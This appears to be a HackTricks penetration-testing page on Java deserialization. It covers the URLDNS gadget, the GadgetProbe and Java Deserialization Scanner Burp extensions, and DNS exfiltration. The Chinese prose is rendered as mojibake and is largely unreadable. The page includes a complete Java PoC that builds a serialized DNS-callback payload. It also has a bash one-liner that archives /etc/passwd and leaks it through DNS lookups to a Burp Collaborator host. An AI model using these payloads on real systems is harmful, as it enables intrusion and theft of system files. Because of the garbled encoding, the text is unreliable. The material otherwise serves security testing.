# Java DNSååºåˆ—åŒ–ã€GadgetProbeå’ŒJavaååºåˆ—åŒ–æ‰«æå™¨

## Java DNSååºåˆ—åŒ–ã€GadgetProbeå’ŒJavaååºåˆ—åŒ–æ‰«æå™¨

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ååºåˆ—åŒ–æ—¶çš„DNSè¯·æ±‚

ç±» `java.net.URL` å®ç°äº† `Serializable` æ¥å£ï¼Œè¿™æ„å‘³ç€è¿™ä¸ªç±»å¯ä»¥è¢«åºåˆ—åŒ–ã€‚
```java
public final class URL implements java.io.Serializable {
```
```markdown
æ­¤ç±»å…·æœ‰ä¸€ä¸ª**å¥‡ç‰¹çš„è¡Œä¸º**ã€‚æ ¹æ®æ–‡æ¡£ï¼šâ€œ**å¦‚æœä¸¤ä¸ªä¸»æœºåéƒ½å¯ä»¥è§£æä¸ºç›¸åŒçš„IPåœ°å€ï¼Œåˆ™è®¤ä¸ºå®ƒä»¬æ˜¯ç­‰æ•ˆçš„**â€ã€‚\
å› æ­¤ï¼Œæ¯å½“ä¸€ä¸ªURLå¯¹è±¡è°ƒç”¨**ä»»ä½•** **`equals`** å‡½æ•°æˆ– **`hashCode`** å‡½æ•°æ—¶ï¼Œéƒ½ä¼š**å‘é€**ä¸€ä¸ª**DNSè¯·æ±‚**ä»¥è·å–IPåœ°å€ã€‚

**è°ƒç”¨**æ¥è‡ª**URL**å¯¹è±¡çš„**`hashCode`** å‡½æ•°éå¸¸ç®€å•ï¼Œåªéœ€å°†æ­¤å¯¹è±¡æ’å…¥åˆ°å°†è¦è¢«ååºåˆ—åŒ–çš„`HashMap`ä¸­å³å¯ã€‚è¿™æ˜¯å› ä¸ºåœ¨`HashMap`çš„**`readObject`** å‡½æ•°çš„**æœ€å**ï¼Œä¼šæ‰§è¡Œè¿™æ®µä»£ç ï¼š
```
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
å®ƒå°†**æ‰§è¡Œ** `putVal` å‡½æ•°ï¼Œå¹¶å°† `HashMap` ä¸­çš„æ¯ä¸ªå€¼ä½œä¸ºå‚æ•°ã€‚ä½†æ›´é‡è¦çš„æ˜¯ï¼Œå®ƒä¼šå¯¹æ¯ä¸ªå€¼è°ƒç”¨ `hash` å‡½æ•°ã€‚ä»¥ä¸‹æ˜¯ `hash` å‡½æ•°çš„ä»£ç ï¼š
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
æ­£å¦‚æ‚¨æ‰€è§‚å¯Ÿåˆ°çš„ï¼Œ**åœ¨ååºåˆ—åŒ–**ä¸€ä¸ª **`HashMap`** æ—¶ï¼Œå‡½æ•° `hash` å°†ä¼š**å¯¹æ¯ä¸ªå¯¹è±¡æ‰§è¡Œ**ï¼Œå¹¶ä¸”**åœ¨**æ‰§è¡Œ **`hash`** çš„è¿‡ç¨‹ä¸­ï¼Œå°†ä¼šæ‰§è¡Œå¯¹è±¡çš„ `.hashCode()` æ–¹æ³•ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨**ååºåˆ—åŒ–**ä¸€ä¸ª**åŒ…å«** **URL** å¯¹è±¡çš„ **`HashMap`**ï¼Œ**URL å¯¹è±¡**å°†ä¼š**æ‰§è¡Œ** `.hashCode()`ã€‚

ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ `URLObject.hashCode()` çš„ä»£ç ï¼š
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
```markdown
å¦‚æ‚¨æ‰€è§ï¼Œå½“ `URLObject` æ‰§è¡Œ `.hashCode()` æ—¶ï¼Œå®ƒè°ƒç”¨çš„æ˜¯ `hashCode(this)`ã€‚æ¥ä¸‹æ¥æ‚¨å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„ä»£ç ï¼š
```
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
æ‚¨å¯ä»¥çœ‹åˆ°å¯¹åŸŸæ‰§è¡Œäº†ä¸€ä¸ª `getHostAddress`ï¼Œ**è§¦å‘äº† DNS æŸ¥è¯¢**ã€‚

å› æ­¤ï¼Œè¿™ä¸ªç±»å¯ä»¥è¢«**æ»¥ç”¨**æ¥**å‘èµ·**ä¸€ä¸ª**DNS æŸ¥è¯¢**ï¼Œä»¥**è¯æ˜****ååºåˆ—åŒ–**æ˜¯å¯èƒ½çš„ï¼Œç”šè‡³å¯ä»¥ç”¨æ¥**æ³„éœ²ä¿¡æ¯**ï¼ˆæ‚¨å¯ä»¥å°†å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºæ·»åŠ ä¸ºå­åŸŸåï¼‰ã€‚

### URLDNS è´Ÿè½½ä»£ç ç¤ºä¾‹

æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ° [ysoserial çš„ URDNS è´Ÿè½½ä»£ç ](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)ã€‚ç„¶è€Œï¼Œä¸ºäº†æ›´å®¹æ˜“ç†è§£å¦‚ä½•ç¼–å†™ä»£ç ï¼Œæˆ‘åˆ›å»ºäº†æˆ‘è‡ªå·±çš„ PoCï¼ˆåŸºäº ysoserial çš„é‚£ä¸ªï¼‰ï¼š
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### æ›´å¤šä¿¡æ¯

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* åœ¨æœ€åˆçš„æƒ³æ³•ä¸­ï¼Œcommons collections payloadè¢«æ›´æ”¹ä¸ºæ‰§è¡ŒDNSæŸ¥è¯¢ï¼Œè¿™æ¯”å»ºè®®çš„æ–¹æ³•ä¸é‚£ä¹ˆå¯é ï¼Œä½†è¿™æ˜¯å¸–å­ï¼š[https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

æ‚¨å¯ä»¥ä»Burp Suiteåº”ç”¨å•†åº—ï¼ˆExtenderï¼‰ä¸‹è½½ [**GadgetProbe**](https://github.com/BishopFox/GadgetProbe)ã€‚

**GadgetProbe** å°†å°è¯•ç¡®å®šæœåŠ¡å™¨çš„Javaç±»ä¸­æ˜¯å¦å­˜åœ¨æŸäº› **Javaç±»**ï¼Œä»¥ä¾¿æ‚¨çŸ¥é“å®ƒæ˜¯å¦å®¹æ˜“å—åˆ°æŸäº›å·²çŸ¥æ¼æ´çš„æ”»å‡»ã€‚

### å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„

**GadgetProbe** å°†ä½¿ç”¨ä¸Šä¸€èŠ‚ä¸­ç›¸åŒçš„ **DNS payload**ï¼Œä½†åœ¨è¿è¡ŒDNSæŸ¥è¯¢ä¹‹å‰ï¼Œå®ƒå°† **å°è¯•ååºåˆ—åŒ–ä¸€ä¸ªä»»æ„ç±»**ã€‚å¦‚æœ **ä»»æ„ç±»å­˜åœ¨**ï¼Œ**DNSæŸ¥è¯¢** å°†è¢« **å‘é€**ï¼Œå¹¶ä¸”GadgetProbeå°†æ³¨æ„åˆ°è¿™ä¸ªç±»å­˜åœ¨ã€‚å¦‚æœ **DNS** è¯·æ±‚ **ä»æœªå‘é€**ï¼Œè¿™æ„å‘³ç€ **ä»»æ„ç±»æ²¡æœ‰è¢«æˆåŠŸååºåˆ—åŒ–**ï¼Œæ‰€ä»¥å®ƒè¦ä¹ˆä¸å­˜åœ¨ï¼Œè¦ä¹ˆ **ä¸å¯åºåˆ—åŒ–/ä¸å¯åˆ©ç”¨**ã€‚

åœ¨githubå†…éƒ¨ï¼Œ[**GadgetProbeæœ‰ä¸€äº›ç”¨äºæµ‹è¯•çš„Javaç±»çš„è¯è¡¨**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists)ã€‚

![](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### æ›´å¤šä¿¡æ¯

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Javaååºåˆ—åŒ–æ‰«æå™¨

æ­¤æ‰«æå™¨å¯ä»¥ä»Burpåº”ç”¨å•†åº—ï¼ˆExtenderï¼‰**ä¸‹è½½**ã€‚\
è¯¥ **æ‰©å±•** å…·æœ‰ **è¢«åŠ¨** å’Œä¸»åŠ¨ **èƒ½åŠ›**ã€‚

### è¢«åŠ¨

é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¼š **è¢«åŠ¨æ£€æŸ¥** æ‰€æœ‰å‘é€çš„è¯·æ±‚å’Œå“åº”ï¼Œ**å¯»æ‰¾** **Javaåºåˆ—åŒ–é­”æœ¯å­—èŠ‚**ï¼Œå¦‚æœå‘ç°ä»»ä½•å­—èŠ‚ï¼Œå°†å‘ˆç°æ¼æ´è­¦å‘Šï¼š

![](<../../.gitbook/assets/image (290).png>)

### ä¸»åŠ¨

**æ‰‹åŠ¨æµ‹è¯•**

æ‚¨å¯ä»¥é€‰æ‹©ä¸€ä¸ªè¯·æ±‚ï¼Œå³é”®å•å‡»å¹¶ `å‘é€è¯·æ±‚åˆ°DS - æ‰‹åŠ¨æµ‹è¯•`ã€‚\
ç„¶åï¼Œåœ¨ _ååºåˆ—åŒ–æ‰«æå™¨é€‰é¡¹å¡_ --> _æ‰‹åŠ¨æµ‹è¯•é€‰é¡¹å¡_ ä¸­ï¼Œæ‚¨å¯ä»¥é€‰æ‹© **æ’å…¥ç‚¹**ã€‚å¹¶ **å¯åŠ¨æµ‹è¯•**ï¼ˆæ ¹æ®ä½¿ç”¨çš„ç¼–ç é€‰æ‹©é€‚å½“çš„æ”»å‡»ï¼‰ã€‚

![](../../.gitbook/assets/3-1.png)

å³ä½¿è¿™è¢«ç§°ä¸ºâ€œæ‰‹åŠ¨æµ‹è¯•â€ï¼Œå®ƒä¹Ÿæ˜¯ç›¸å½“ **è‡ªåŠ¨åŒ–** çš„ã€‚å®ƒå°†è‡ªåŠ¨æ£€æŸ¥ **ååºåˆ—åŒ–** æ˜¯å¦å®¹æ˜“å—åˆ° **ä»»ä½•ysoserial payload** çš„æ”»å‡»ï¼Œæ£€æŸ¥ç½‘ç»œæœåŠ¡å™¨ä¸Šå­˜åœ¨çš„åº“ï¼Œå¹¶å°†çªå‡ºæ˜¾ç¤ºæ˜“å—æ”»å‡»çš„åº“ã€‚ä¸ºäº† **æ£€æŸ¥** **æ˜“å—æ”»å‡»çš„åº“**ï¼Œæ‚¨å¯ä»¥é€‰æ‹©å¯åŠ¨ **Java Sleeps**ï¼Œé€šè¿‡ **CPU** æ¶ˆè€—çš„ **sleeps**ï¼Œæˆ–ä½¿ç”¨ **DNS**ï¼Œå¦‚å‰æ‰€è¿°ã€‚

**åˆ©ç”¨**

ä¸€æ—¦æ‚¨ç¡®å®šäº†ä¸€ä¸ªæ˜“å—æ”»å‡»çš„åº“ï¼Œæ‚¨å¯ä»¥å°†è¯·æ±‚å‘é€åˆ° _åˆ©ç”¨é€‰é¡¹å¡_ã€‚\
åœ¨è¿™ä¸ªé€‰é¡¹å¡ä¸­ï¼Œæ‚¨å¿…é¡»å†æ¬¡ **é€‰æ‹©** **æ³¨å…¥ç‚¹**ï¼Œå¹¶ **ç¼–å†™** æ‚¨æƒ³ä¸ºå…¶åˆ›å»ºpayloadçš„ **æ˜“å—æ”»å‡»çš„åº“**ï¼Œä»¥åŠ **å‘½ä»¤**ã€‚ç„¶åï¼Œåªéœ€æŒ‰ä¸‹é€‚å½“çš„ **æ”»å‡»** æŒ‰é’®ã€‚

![](<../../.gitbook/assets/4 (1).png>)

### Javaååºåˆ—åŒ–DNS Exfilä¿¡æ¯

ä½¿æ‚¨çš„payloadæ‰§è¡Œç±»ä¼¼ä»¥ä¸‹æ“ä½œï¼š
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### æ›´å¤šä¿¡æ¯

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
